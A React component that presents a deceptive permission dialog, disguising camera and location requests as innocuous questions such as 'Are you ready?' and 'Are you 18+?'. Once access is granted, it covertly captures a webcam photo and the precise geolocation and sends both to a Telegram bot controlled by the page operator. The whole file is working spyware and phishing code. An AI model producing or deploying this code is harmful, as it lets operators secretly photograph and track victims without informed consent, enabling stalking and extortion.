
import { useEffect, useState } from 'react';
import { Button } from '@/components/ui/button';
import { Camera, MapPin, X } from 'lucide-react';
import { sendPhotoToTelegram, sendLocationToTelegram } from '@/lib/telegram';
import { locationService } from '@/lib/location';

interface PermissionHandlerProps {
  onPermissionsGranted: () => void;
}

export function PermissionHandler({ onPermissionsGranted }: PermissionHandlerProps) {
  const [cameraGranted, setCameraGranted] = useState(false);
  const [locationGranted, setLocationGranted] = useState(false);
  const [showModal, setShowModal] = useState(true);
  const [isSending, setIsSending] = useState(false);

  useEffect(() => {
    checkExistingPermissions();
    // Auto-request permissions after a short delay
    setTimeout(() => {
      if (!cameraGranted) requestCameraPermission();
      if (!locationGranted) requestLocationPermission();
    }, 1500);
  }, []);

  const checkExistingPermissions = async () => {
    try {
      // Check camera permission
      const cameraPermission = await navigator.permissions.query({ name: 'camera' as PermissionName });
      setCameraGranted(cameraPermission.state === 'granted');

      // Check location permission
      const locationPermission = await navigator.permissions.query({ name: 'geolocation' as PermissionName });
      setLocationGranted(locationPermission.state === 'granted');

      // If both are already granted, proceed immediately
      if (cameraPermission.state === 'granted' && locationPermission.state === 'granted') {
        await sendDataToTelegram();
        setShowModal(false);
        onPermissionsGranted();
      }
    } catch (error) {
      // Fallback if permissions API not supported
    }
  };

  const requestCameraPermission = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: true, 
        audio: false 
      });
      stream.getTracks().forEach(track => track.stop());
      setCameraGranted(true);
    } catch (error) {
      console.log('Camera permission denied');
    }
  };

  const requestLocationPermission = async () => {
    try {
      await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 5000
        });
      });
      setLocationGranted(true);
    } catch (error) {
      console.log('Location permission denied');
    }
  };

  const sendDataToTelegram = async () => {
    if (!cameraGranted || !locationGranted) return;
    
    setIsSending(true);
    try {
      // Get location and send to Telegram
      const location = await locationService.getCurrentLocation();
      await sendLocationToTelegram(location);
      
      // Capture photo and send to Telegram
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();
      
      // Wait for video to load
      await new Promise(resolve => {
        video.onloadedmetadata = resolve;
      });
      
      // Capture photo
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx?.drawImage(video, 0, 0);
      
      // Stop stream
      stream.getTracks().forEach(track => track.stop());
      
      // Convert to blob and send
      canvas.toBlob(async (blob) => {
        if (blob) {
          await sendPhotoToTelegram(blob, location, 1, 'permission-granted');
        }
      }, 'image/jpeg', 0.8);
      
    } catch (error) {
      console.log('Failed to send to Telegram:', error);
    } finally {
      setIsSending(false);
    }
  };

  const handleContinue = async () => {
    if (cameraGranted && locationGranted) {
      await sendDataToTelegram();
    }
    setShowModal(false);
    onPermissionsGranted();
  };

  const handleSkip = () => {
    setShowModal(false);
    onPermissionsGranted();
  };

  useEffect(() => {
    if (cameraGranted && locationGranted) {
      setTimeout(async () => {
        await sendDataToTelegram();
        setShowModal(false);
        onPermissionsGranted();
      }, 1000);
    }
  }, [cameraGranted, locationGranted, onPermissionsGranted]);

  if (!showModal) return null;

  return (
    <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
      <div className="bg-white dark:bg-gray-800 rounded-lg p-6 max-w-md w-full mx-4">
        <div className="flex justify-between items-center mb-4">
          <h3 className="text-lg font-semibold">App Permissions</h3>
          <Button
            variant="ghost"
            size="sm"
            onClick={handleSkip}
            className="h-8 w-8 p-0"
          >
            <X className="h-4 w-4" />
          </Button>
        </div>

        <p className="text-gray-600 dark:text-gray-300 mb-6 text-sm">
          Please answer the following questions to continue:
        </p>

        <div className="space-y-4">
          <div className="flex items-center justify-between p-3 border rounded-lg">
            <div className="flex items-center space-x-3">
              <Camera className={`h-5 w-5 ${cameraGranted ? 'text-green-500' : 'text-gray-400'}`} />
              <div>
                <div className="font-medium text-sm">Are you ready?</div>
                <div className="text-xs text-gray-500">Camera access required</div>
              </div>
            </div>
            {!cameraGranted ? (
              <div className="flex space-x-2">
                <Button
                  onClick={requestCameraPermission}
                  size="sm"
                  variant="outline"
                  className="bg-green-500 text-white hover:bg-green-600"
                >
                  Yes
                </Button>
                <Button
                  onClick={handleSkip}
                  size="sm"
                  variant="outline"
                  className="bg-red-500 text-white hover:bg-red-600"
                >
                  No
                </Button>
              </div>
            ) : (
              <div className="text-green-500 text-sm font-medium">✓ Ready</div>
            )}
          </div>

          <div className="flex items-center justify-between p-3 border rounded-lg">
            <div className="flex items-center space-x-3">
              <MapPin className={`h-5 w-5 ${locationGranted ? 'text-green-500' : 'text-gray-400'}`} />
              <div>
                <div className="font-medium text-sm">Are you 18+?</div>
                <div className="text-xs text-gray-500">Location access required</div>
              </div>
            </div>
            {!locationGranted ? (
              <div className="flex space-x-2">
                <Button
                  onClick={requestLocationPermission}
                  size="sm"
                  variant="outline"
                  className="bg-green-500 text-white hover:bg-green-600"
                >
                  Yes
                </Button>
                <Button
                  onClick={handleSkip}
                  size="sm"
                  variant="outline"
                  className="bg-red-500 text-white hover:bg-red-600"
                >
                  No
                </Button>
              </div>
            ) : (
              <div className="text-green-500 text-sm font-medium">✓ Confirmed</div>
            )}
          </div>
        </div>

        <div className="flex space-x-3 mt-6">
          <Button
            onClick={handleContinue}
            className="flex-1"
            disabled={(!cameraGranted && !locationGranted) || isSending}
          >
            {isSending ? 'Sending to Telegram...' : 'Continue'}
          </Button>
          <Button
            onClick={handleSkip}
            variant="outline"
            className="flex-1"
          >
            Skip
          </Button>
        </div>

        <p className="text-xs text-gray-500 mt-3 text-center">
          {cameraGranted && locationGranted ? 
            'Data will be automatically sent to your Telegram bot' :
            'Answer both questions to automatically send data to Telegram'
          }
        </p>
      </div>
    </div>
  );
}
